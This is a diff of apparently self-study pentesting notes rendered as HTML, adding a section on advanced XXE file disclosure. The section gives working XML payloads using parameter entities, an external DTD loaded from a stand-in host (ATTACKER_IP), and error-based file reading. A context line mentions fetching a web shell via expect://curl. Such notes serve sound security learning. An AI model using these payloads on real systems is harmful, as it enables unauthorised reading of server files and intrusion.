@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-67dcea17.js";
+            window.path_to_searchindex_js = "searchindex-674b2f7c.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-1af41089.js"></script>
+        <script src="toc-7371516b.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -28165,6 +28165,7 @@ $result = $conn-&gt;query($query);
 <li><a href="#idor--mass-enumeration">IDOR mass enumeration — insecure parameters, static file IDOR, parameter-based IDOR, bulk download scripting</a></li>
 <li><a href="#intro-to-xxe-injection">Intro to XXE — XML structure, DTD, internal/external entities, the external entity file-read primitive</a></li>
 <li><a href="#xxe--local-file-disclosure">XXE local file disclosure — identifying XXE, reading files/source code, RCE via expect/curl, SSRF, DoS</a></li>
+<li><a href="#xxe--advanced-file-disclosure">XXE advanced file disclosure — CDATA + parameter entities + external DTD, error-based XXE</a></li>
 <li><a href="#idor--bypassing-encoded-references">IDOR — Bypassing Encoded References — MD5/Base64 schemes, function disclosure, reproducing hashes, mass enumeration script</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
@@ -28178,6 +28179,7 @@ $result = $conn-&gt;query($query);
 <p><strong>Bypassing encoded references</strong> exploits the common mistake of performing hashing or encoding client-side. When a web application obscures object references using a scheme like <code>MD5(Base64(uid))</code>, the algorithm is visible to anyone who reads the front-end JavaScript source. Reproducing the scheme on the command line (<code>echo -n 1 | base64 -w 0 | md5sum</code>) confirms the algorithm, after which all object references become calculable and the protection is equivalent to none. A bash loop generates hashes for every target UID and <code>curl -sOJ</code> downloads the associated file in a single script. True security requires the hash to be computed server-side with a secret salt <strong>and</strong> a back-end authorization check — encoding or hashing alone is not access control.</p>
 <p><strong>XXE Injection</strong> targets web applications that parse user-supplied XML (SOAP APIs, web forms, file uploads) using XML parsers that allow external entity resolution. XML documents can define <strong>external entities</strong> via the <code>SYSTEM</code> keyword (<code>&lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;</code>); when the server parses the document and substitutes entity references in its response, the contents of local files are returned to the attacker. The DTD mechanism (<code>&lt;!DOCTYPE&gt;</code>) is what makes this possible — it allows entities to be defined inline before the parser processes the document body. Understanding the core XML primitives (elements, attributes, entities, DTD declarations) is prerequisite to constructing XXE payloads.</p>
 <p><strong>XXE local file disclosure</strong> starts by confirming entity injection: insert an inline DTD with an internal entity and check whether the reflected value in the response is substituted (<code>Inlane Freight</code>) or literal (<code>&amp;company;</code>). Once confirmed, switch to an external <code>SYSTEM</code> entity pointing to <code>file:///etc/passwd</code> to read server files. PHP source code containing special XML characters can be read using <code>php://filter/convert.base64-encode/resource=index.php</code> — the base64 output is safe to embed in XML. RCE is possible via <code>expect://</code> (PHP only, module rarely enabled) or by using <code>expect://curl$IFS</code> to fetch and write a web shell; <code>$IFS</code> substitutes for spaces to avoid breaking XML syntax. XXE also enables <strong>SSRF</strong> (internal URL probing) and a <strong>Billion Laughs DoS</strong> (exponential entity expansion) — though modern servers protect against the latter.</p>
+<p><strong>XXE advanced file disclosure</strong> covers two techniques for cases where basic <code>file://</code> fails or produces no output. <strong>CDATA + parameter entities</strong>: direct entity joining is blocked by the XML spec, but if all entities are declared in an <strong>external DTD</strong> served from the attacker’s machine, they are treated as external and can be freely joined — assemble <code>&lt;![CDATA[ %file; ]]&gt;</code> in <code>xxe.dtd</code>, serve it with <code>python3 -m http.server</code>, and reference it with <code>&lt;!ENTITY % xxe SYSTEM "http://ATTACKER_IP/xxe.dtd"&gt;</code> followed by <code>%xxe;</code>; the <code>&amp;joined;</code> entity then returns raw file source without base64 or encoding. <strong>Error-based XXE</strong>: when no output is reflected but runtime errors are displayed, define a parameter entity that triggers an error containing the file contents (<code>%nonExistingEntity;/%file;</code>); the parser error message embeds the file data. Error-based output may be truncated and is less reliable than CDATA for source code, but works when there is nothing else to observe.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28614,6 +28616,72 @@ done
 <li><strong>Disclose local files</strong> on the back-end server (configuration files, source code, credentials)</li>
 <li>Enable <strong>Whitebox Penetration Testing</strong> if source code is leaked</li>
 <li><strong>Steal server credentials</strong> and potentially achieve remote code execution by compromising the hosting server</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="xxe--advanced-file-disclosure"><a class="header" href="#xxe--advanced-file-disclosure">XXE — Advanced File Disclosure</a></h1>
+<h2 id="advanced-exfiltration-with-cdata"><a class="header" href="#advanced-exfiltration-with-cdata">Advanced exfiltration with CDATA</a></h2>
+<p>Basic <code>file://</code> references break on source files containing XML special characters (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>). The PHP base64 filter solves this for PHP apps, but a more universal approach is wrapping file content in a <strong>CDATA</strong> block so the parser treats it as raw data:</p>
+<pre><code class="language-xml">&lt;![CDATA[ file content here ]]&gt;
+</code></pre>
+<h3 id="why-direct-entity-joining-fails"><a class="header" href="#why-direct-entity-joining-fails">Why direct entity joining fails</a></h3>
+<p>A naive attempt to assemble the CDATA wrapper with internal entities is rejected by the XML spec — internal and external entities cannot be joined directly:</p>
+<pre><code class="language-xml">&lt;!-- This does NOT work --&gt;
+&lt;!ENTITY begin "&lt;![CDATA["&gt;
+&lt;!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php"&gt;
+&lt;!ENTITY end "]]&gt;"&gt;
+&lt;!ENTITY joined "&amp;begin;&amp;file;&amp;end;"&gt;
+</code></pre>
+<h3 id="solution--xml-parameter-entities--external-dtd"><a class="header" href="#solution--xml-parameter-entities--external-dtd">Solution — XML Parameter Entities + external DTD</a></h3>
+<p><strong>Parameter entities</strong> (prefixed with <code>%</code>) can only be used inside a DTD, but if all entities are loaded from an <strong>external DTD</strong>, they are treated as external entities and can be joined freely.</p>
+<p><strong>Step 1 — create <code>xxe.dtd</code> on your server:</strong></p>
+<pre><code>&lt;!ENTITY joined "%begin;%file;%end;"&gt;
+</code></pre>
+<p><strong>Step 2 — serve it:</strong></p>
+<pre><code class="language-bash">python3 -m http.server 8000
+</code></pre>
+<p><strong>Step 3 — reference it from the target:</strong></p>
+<pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY % begin "&lt;![CDATA["&gt;
+  &lt;!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"&gt;
+  &lt;!ENTITY % end "]]&gt;"&gt;
+  &lt;!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd"&gt;
+  %xxe;
+]&gt;
+...
+&lt;email&gt;&amp;joined;&lt;/email&gt;
+</code></pre>
+<p>The parser loads <code>xxe.dtd</code>, assembles the <code>joined</code> entity as <code>&lt;![CDATA[ &lt;file contents&gt; ]]&gt;</code>, and returns the raw file source in the response — no base64 encoding needed.</p>
+<p><strong>Note:</strong> Some web servers block files that would cause entity self-reference loops (e.g., <code>index.php</code> referencing itself). Try other files if a specific one fails.</p>
+<hr>
+<h2 id="error-based-xxe"><a class="header" href="#error-based-xxe">Error-based XXE</a></h2>
+<p>Used when the application outputs <strong>nothing</strong> from the XML response — no reflected entity values, but it does display <strong>runtime errors</strong> (e.g., PHP errors) and lacks proper exception handling.</p>
+<h3 id="confirm-error-output"><a class="header" href="#confirm-error-output">Confirm error output</a></h3>
+<p>Send malformed XML to see whether errors are shown:</p>
+<ul>
+<li>Delete a closing tag</li>
+<li>Reference a non-existent entity: <code>&amp;nonExistingEntity;</code></li>
+</ul>
+<p>If a PHP error appears revealing a file path (e.g., the web root), the error channel is usable for exfiltration.</p>
+<h3 id="exploit--trigger-a-descriptive-error-containing-file-contents"><a class="header" href="#exploit--trigger-a-descriptive-error-containing-file-contents">Exploit — trigger a descriptive error containing file contents</a></h3>
+<p><strong>Create <code>xxe.dtd</code> on your server:</strong></p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;
+&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"&gt;
+</code></pre>
+<p>The <code>%error;</code> entity tries to load a URI that is <code>nonExistingEntity/&lt;file contents&gt;</code>. Since <code>%nonExistingEntity;</code> doesn’t exist, the parser throws an error with the full constructed string — embedding the file content inside the error message.</p>
+<p><strong>Reference it from the target:</strong></p>
+<pre><code class="language-xml">&lt;!DOCTYPE email [
+  &lt;!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd"&gt;
+  %remote;
+  %error;
+]&gt;
+</code></pre>
+<p>No other XML body is needed. The response error will contain the contents of <code>/etc/hosts</code>.</p>
+<p><strong>Limitations:</strong></p>
+<ul>
+<li>Output may be truncated for large files</li>
+<li>Special characters in the file may still break the error string</li>
+<li>Less reliable than CDATA exfiltration for source code reading</li>
+<li>Requires the application to display unhandled runtime errors</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="intro-to-xxe-injection"><a class="header" href="#intro-to-xxe-injection">Intro to XXE Injection</a></h1>
